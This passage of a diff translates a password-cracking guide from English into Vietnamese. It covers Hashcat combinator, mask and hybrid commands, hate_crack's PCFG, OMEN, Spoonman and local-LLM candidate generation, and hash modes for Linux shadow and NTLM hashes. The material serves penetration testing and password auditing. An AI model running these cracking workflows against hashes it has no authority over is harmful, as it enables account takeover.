+Hashcat attack mode `1` nối từng dòng trong dictionary bên phải vào từng dòng trong dictionary bên trái, vì vậy các tệp chứa lần lượt `L` và `R` dòng sẽ tạo ra `L × R` ứng viên trước khi áp dụng bất kỳ rules nào. Lệnh sau đây dành riêng cho record `$oldoffice$3/$4` cũ; hãy thay đổi mode đối với các định dạng Office khác.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-This preprocessing pattern generalizes to other offline-verifiable formats: enumerate only plausible capitalization, dates, separators, digits, or punctuation for one component, then combine it with the remaining component instead of brute-forcing the nominal full length.<sup>[[4]](#references)[[5]](#references)</sup>
+Mẫu tiền xử lý này có thể áp dụng cho các định dạng khác có thể xác minh ngoại tuyến: chỉ liệt kê các cách viết hoa, ngày tháng, dấu phân cách, chữ số hoặc dấu câu có khả năng xảy ra cho một thành phần, rồi kết hợp với thành phần còn lại thay vì brute-force toàn bộ độ dài danh nghĩa.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -921,15 +921,15 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
 
-#### Validate `.hcmask` files before a run
+#### Xác thực tệp `.hcmask` trước khi chạy
 
-A malformed line can be lost among valid masks, so validate the complete file and its estimated keyspace before launching the attack. HashcatRosetta reports the failing line and returns a non-zero status when any mask is invalid, which makes the check suitable for scripts or CI.<sup>[[6]](#references)[[9]](#references)</sup>
+Một dòng sai định dạng có thể bị bỏ sót giữa các mask hợp lệ, vì vậy hãy xác thực toàn bộ tệp và keyspace ước tính trước khi khởi chạy cuộc tấn công. HashcatRosetta báo dòng bị lỗi và trả về trạng thái khác không nếu có bất kỳ mask nào không hợp lệ, nhờ đó bước kiểm tra này phù hợp để dùng trong script hoặc CI.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 hashcat-rosetta masks.hcmask --verify-masks
 ```
 
-Do not normalize mask files with generic CSV or text parsers. Hashcat supports custom charsets `?1` through `?8`, treats `#` as a comment only when it is the first byte, and removes backslash escapes in one pass before interpreting `?` tokens. Therefore leading whitespace before `#` is mask data, and escaping can change whether a sequence is a literal or a charset token.<sup>[[6]](#references)[[9]](#references)</sup>
+Không chuẩn hóa các tệp mask bằng trình phân tích cú pháp CSV hoặc văn bản thông thường. Hashcat hỗ trợ các charset tùy chỉnh `?1` đến `?8`, chỉ coi `#` là comment khi nó là byte đầu tiên, và loại bỏ các ký tự escape dấu gạch chéo ngược trong một lượt trước khi diễn giải các token `?`. Vì vậy, khoảng trắng đứng trước `#` sẽ là dữ liệu mask, còn việc escape có thể làm thay đổi một chuỗi được hiểu là ký tự nguyên văn hay token charset.<sup>[[6]](#references)[[9]](#references)</sup>
 
 - Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack
 
@@ -941,9 +941,9 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
 
-#### Target-trained Hashcat passes with hate_crack
+#### Các lượt chạy Hashcat được tối ưu theo mục tiêu với hate_crack
 
-[hate_crack](https://github.com/trustedsec/hate_crack) orchestrates local Hashcat passes after you have a hash file and know its Hashcat mode. Hashcat itself must be installed separately. Clone with submodules, run `make`, then start an interactive session; the example mode `1000` is NTLM, not a universal default. Existing clones need `git submodule update --init --recursive` before using the PCFG and PRINCE-LING options.<sup>[[13]](#references)[[14]](#references)</sup>
+[hate_crack](https://github.com/trustedsec/hate_crack) điều phối các lượt chạy Hashcat cục bộ sau khi bạn có tệp hash và biết mode Hashcat của nó. Bạn phải cài đặt Hashcat riêng. Clone kèm submodule, chạy `make`, sau đó bắt đầu một phiên tương tác; mode ví dụ `1000` là NTLM, không phải giá trị mặc định dùng chung cho mọi trường hợp. Các bản clone hiện có cần chạy `git submodule update --init --recursive` trước khi sử dụng các tùy chọn PCFG và PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>
 
 ```bash
 git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
@@ -952,7 +952,7 @@ make
 hate_crack hashes.txt 1000
 ```
 
-**Learn a grammar from recovered plaintexts.** Run an initial dictionary/rule pass, then train `pcfg_cracker` on target-relevant plaintexts. Set `pcfgRuleset` in `config.json` to the trained ruleset and choose PCFG (menu `20`) to stream likely structures into Hashcat, or PRINCE-LING (`21`) to build a grammar-guided PRINCE base list. Bound the two generators with `pcfgMaxCandidates` and `pcfgPrinceLingMaxCandidates`; hate_crack does not train the grammar for you. PCFG learns the probability of structures such as baseword plus digits and symbols, unlike the fixed grammar in the [combinator example](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>
+**Học một ngữ pháp từ các bản rõ thu thập được.** Chạy một lượt xử lý từ điển/quy tắc ban đầu, sau đó huấn luyện `pcfg_cracker` trên các bản rõ phù hợp với mục tiêu. Đặt `pcfgRuleset` trong `config.json` thành ruleset đã huấn luyện và chọn PCFG (menu `20`) để đưa các cấu trúc có khả năng cao vào Hashcat, hoặc PRINCE-LING (`21`) để tạo danh sách cơ sở PRINCE theo ngữ pháp. Giới hạn số lượng ứng viên của hai bộ tạo bằng `pcfgMaxCandidates` và `pcfgPrinceLingMaxCandidates`; hate_crack không huấn luyện ngữ pháp thay bạn. PCFG học xác suất của các cấu trúc như từ cơ sở cộng với chữ số và ký hiệu, khác với ngữ pháp cố định trong [ví dụ combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>
 
 ```bash
 cd pcfg_cracker
@@ -962,17 +962,17 @@ cd ..
 hate_crack hashes.txt 1000
 ```
 
-**Mine rules backwards from known passwords.** Spoonman (menu `22`) takes a plaintext corpus, including the current session's nonempty `.out` file, and derives lowercase letter basewords plus Hashcat rules that reconstruct the observed passwords. It ranks rules by the number of corpus passwords they reproduce. Start with the top-50%-coverage tier and expand only if the added keyspace is justified; combine derived basewords with other relevant wordlists when the missing stem, rather than the mutation, limits coverage. Hashcat accepts at most 31 functions per rule and its position alphabet addresses only indices `0`–`35`; Spoonman uses a literal baseword and no-op rule when a password cannot be encoded. Very large corpora can hit its bounded-memory counter cap, so read the reported coverage rather than assuming full reconstruction. See [Hashcat rule behavior](#explain-and-profile-rule-files) before reusing the output independently.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+**Suy ngược rules từ các mật khẩu đã biết.** Spoonman (menu `22`) nhận một corpus văn bản thuần, bao gồm tệp `.out` không rỗng của phiên hiện tại, rồi tạo các baseword chữ thường cùng Hashcat rules để tái tạo những mật khẩu đã quan sát được. Công cụ xếp hạng rules theo số mật khẩu trong corpus mà chúng tái tạo được. Bắt đầu với nhóm bao phủ 50% cao nhất và chỉ mở rộng nếu keyspace bổ sung là hợp lý; kết hợp các baseword được suy ra với những wordlist liên quan khác khi stem còn thiếu, chứ không phải mutation, là yếu tố giới hạn độ bao phủ. Hashcat chấp nhận tối đa 31 function cho mỗi rule và bảng chữ cái vị trí chỉ định các chỉ số `0`–`35`; Spoonman dùng baseword nguyên dạng và rule no-op khi không thể mã hóa mật khẩu. Corpus rất lớn có thể chạm giới hạn bộ đếm bộ nhớ hữu hạn của công cụ, vì vậy hãy xem độ bao phủ được báo cáo thay vì mặc định rằng đã tái tạo đầy đủ. Xem [hành vi của Hashcat rules](#explain-and-profile-rule-files) trước khi sử dụng độc lập đầu ra này.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 
-**Choose a generator for the evidence available.** OMEN (`13`) trains a character-transition model from a password list and enumerates candidates in probability order, capped by `omenMaxCandidates`. Markov brute force (`15`) can instead build a `.hcstat2` table from the current `.out` cracks or a selected list and test an incremental length range. When target intelligence is prose rather than passwords, N-gram (`16`) feeds a corpus, including gzip input, to `ngramX.bin`; its default group size is three. These are alternatives, not three copies of the same candidate list.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>
+**Chọn generator phù hợp với bằng chứng hiện có.** OMEN (`13`) huấn luyện mô hình chuyển tiếp ký tự từ danh sách mật khẩu và liệt kê candidate theo thứ tự xác suất, với số lượng tối đa được giới hạn bởi `omenMaxCandidates`. Markov brute force (`15`) có thể tạo bảng `.hcstat2` từ các mật khẩu đã crack trong `.out` hiện tại hoặc từ danh sách được chọn, rồi thử một khoảng độ dài tăng dần. Khi thông tin về mục tiêu là văn xuôi chứ không phải mật khẩu, N-gram (`16`) đưa một corpus, kể cả đầu vào gzip, vào `ngramX.bin`; kích thước nhóm mặc định là ba. Đây là các lựa chọn thay thế cho nhau, không phải ba bản sao của cùng một danh sách candidate.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>
 
-**Expand only small, plausible pools.** Permutation (`17`) reorders every character in each input word, so even one eight-character word yields `8!` orderings. Combipow (`19`) emits nonempty subset combinations from a short passphrase word pool; `-s` inserts spaces and the tool rejects more than 63 input lines. Combinator (`6`) can join multiple wordlists with separators via `--sepFill`; ordinary two-list concatenation is covered by the [native Hashcat combinator](#hashcat-attacks) above.<sup>[[13]](#references)[[14]](#references)</sup>
+**Chỉ mở rộng các pool nhỏ, hợp lý.** Permutation (`17`) sắp xếp lại mọi ký tự trong từng từ đầu vào, vì vậy chỉ một từ dài tám ký tự cũng tạo ra `8!` thứ tự. Combipow (`19`) tạo các tổ hợp tập con không rỗng từ pool từ của một passphrase ngắn; `-s` chèn dấu cách và công cụ từ chối hơn 63 dòng đầu vào. Combinator (`6`) có thể nối nhiều wordlist bằng dấu phân cách thông qua `--sepFill`; thao tác nối thông thường giữa hai danh sách đã được [combinator tích hợp của Hashcat](#hashcat-attacks) ở trên hỗ trợ.<sup>[[13]](#references)[[14]](#references)</sup>
 
-**Budget feedback attacks.** Fingerprint (`5`) iteratively expands newly cracked passwords at increasing fragment lengths, rather than re-expanding the entire corpus each round; its combination keyspace threshold skips an oversized `-a 1` pass. Hybrid (`7`) tries cheaper `?s?d` decorations before broader `?a` prepend/append masks, with `hcatHybridMaxRuntime` bounding the run. This matters because the cost of a hybrid pass is wordlist size multiplied by mask space, so a broad mask against a large list can dwarf the initial passes.<sup>[[13]](#references)[[14]](#references)</sup>
+**Lập ngân sách cho các cuộc tấn công có phản hồi.** Fingerprint (`5`) mở rộng lặp lại các mật khẩu vừa crack theo độ dài mảnh tăng dần, thay vì mở rộng lại toàn bộ corpus ở mỗi vòng; ngưỡng keyspace kết hợp sẽ bỏ qua lượt `-a 1` quá lớn. Hybrid (`7`) thử các cách thêm `?s?d` ít tốn kém hơn trước khi thử các mask prepend/append `?a` rộng hơn, với `hcatHybridMaxRuntime` giới hạn thời gian chạy. Điều này quan trọng vì chi phí của một lượt hybrid bằng kích thước wordlist nhân với không gian mask, nên một mask rộng áp dụng cho danh sách lớn có thể tốn kém hơn nhiều so với các lượt ban đầu.<sup>[[13]](#references)[[14]](#references)</sup>
 
-**Generate candidates from recovered passwords with a local LLM.** After an initial pass has produced a nonempty `<hashfile>.out`, hate_crack's LLM attack (main menu `12`, **Cracked passwords** submenu `3`) can infer target-specific basewords, years, suffixes, and casing, then submit new candidates to Hashcat. Small corpora can include recovered plaintexts in the model prompt; larger corpora are summarized into statistics instead. This generalizes observed conventions rather than only replaying the fixed [rules](#explain-and-profile-rule-files) or [masks](#hashcat-attacks) above.<sup>[[13]](#references)[[14]](#references)</sup>
+**Tạo candidate từ mật khẩu đã khôi phục bằng LLM cục bộ.** Sau khi lượt đầu tiên tạo được `<hashfile>.out` không rỗng, cuộc tấn công LLM của hate_crack (menu chính `12`, menu con **Cracked passwords** `3`) có thể suy luận các baseword, năm, hậu tố và kiểu viết hoa/thường đặc trưng cho mục tiêu, rồi gửi candidate mới cho Hashcat. Corpus nhỏ có thể đưa các plaintext đã khôi phục vào prompt của mô hình; corpus lớn hơn sẽ được tóm tắt thành số liệu thống kê. Phương pháp này khái quát hóa các quy ước đã quan sát được, thay vì chỉ phát lại [rules](#explain-and-profile-rule-files) hoặc [masks](#hashcat-attacks) cố định ở trên.<sup>[[13]](#references)[[14]](#references)</sup>
 
-Configure an already-served local Ollama model in hate_crack's `.env`; it does not pull the model automatically. `OLLAMA_NO_CLOUD=true` rejects cloud-tagged models and offsite endpoint addresses. A localhost endpoint alone is insufficient: Ollama can proxy a `-cloud` model remotely, and prompts can contain recovered plaintexts or corpus statistics. This setting still permits private-network endpoints and cannot rule out a transport proxy, so verify the inference path before sending client data.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+Cấu hình một mô hình Ollama cục bộ đã được phục vụ trong `.env` của hate_crack; công cụ không tự động tải mô hình. `OLLAMA_NO_CLOUD=true` từ chối các mô hình được gắn thẻ cloud và địa chỉ endpoint bên ngoài. Chỉ dùng endpoint localhost là chưa đủ: Ollama có thể proxy một mô hình `-cloud` từ xa, và prompt có thể chứa plaintext đã khôi phục hoặc số liệu thống kê của corpus. Thiết lập này vẫn cho phép endpoint trong mạng riêng và không thể loại trừ proxy truyền tải, vì vậy hãy xác minh đường đi của quá trình suy luận trước khi gửi dữ liệu khách hàng.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 
 ```dotenv
 LLM_BACKEND=ollama
@@ -986,15 +986,15 @@ hate_crack hashes.txt 1000
 # Select 12 (LLM Attack), then 3 (Cracked passwords).
 ```
 
-Compare the candidate yield with cheaper rule, mask, and target-trained passes before allocating a larger budget. The model generates guesses; Hashcat still tests them against the hashes.<sup>[[13]](#references)[[14]](#references)</sup>
+So sánh lượng ứng viên thu được với các lượt chạy rule, mask và được huấn luyện trên mục tiêu có chi phí thấp hơn trước khi phân bổ ngân sách lớn hơn. Model tạo ra các phỏng đoán; Hashcat vẫn kiểm tra chúng với các hash.<sup>[[13]](#references)[[14]](#references)</sup>
 
-#### Hashcat modes
+#### Các chế độ Hashcat
 
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Cracking Linux Hashes - /etc/shadow file
+Cracking Hash Linux - tệp /etc/shadow
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -1003,14 +1003,14 @@ Cracking Linux Hashes - /etc/shadow file
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
 
-Cracking Windows Hashes
+Bẻ khóa Hash Windows
 
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
 
-Cracking Common Application Hashes
+Cracking các hash ứng dụng phổ biến
 
 ```
   900 | MD4                                              | Raw Hash
@@ -1024,20 +1024,19 @@ Cracking Common Application Hashes
 
 ## References
 
-- [1] [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Bên trong GoBruteforcer: cấu hình máy chủ mặc định do AI tạo, mật khẩu yếu và các chiến dịch tập trung vào crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
-- [3] [Hashcat example hashes and Microsoft Office modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
-- [5] [Estate planning of credentials](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
-- [6] [HashcatRosetta repository](https://github.com/bandrel/HashcatRosetta)
-- [7] [Hashcat debug-file implementation](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
-- [8] [Hashcat command-line help](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
-- [9] [HashcatRosetta: Reading the Rosetta Stone of Password Cracking](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
-- [10] [PCFG Cracker repository and usage](https://github.com/lakiw/pcfg_cracker)
-- [11] [OMEN repository and user guide](https://github.com/RUB-SysSec/OMEN)
-- [12] [Spoonman original issue and rule derivation design](https://github.com/trustedsec/hate_crack/issues/169)
-- [13] [hate_crack repository and attack documentation](https://github.com/trustedsec/hate_crack)
-- [14] [What's New in hate_crack Since 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
-- [15] [hate_crack LLM destination policy](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
-
+- [3] [Các hash mẫu của Hashcat và các chế độ Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [4] [Tấn công combinator của Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [5] [Lập kế hoạch thừa kế thông tin xác thực](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [Kho lưu trữ HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
+- [7] [Cách triển khai tệp debug của Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
+- [8] [Trợ giúp dòng lệnh Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
+- [9] [HashcatRosetta: Giải mã Rosetta Stone của việc bẻ khóa mật khẩu](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
+- [10] [Kho lưu trữ và cách sử dụng PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
+- [11] [Kho lưu trữ và hướng dẫn sử dụng OMEN](https://github.com/RUB-SysSec/OMEN)
+- [12] [Issue gốc và thiết kế suy ra rule của Spoonman](https://github.com/trustedsec/hate_crack/issues/169)
+- [13] [Kho lưu trữ hate_crack và tài liệu về các cuộc tấn công](https://github.com/trustedsec/hate_crack)
+- [14] [Những điểm mới trong hate_crack kể từ phiên bản 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
+- [15] [Chính sách đích đến LLM của hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
 {{#include ../banners/hacktricks-training.md}}
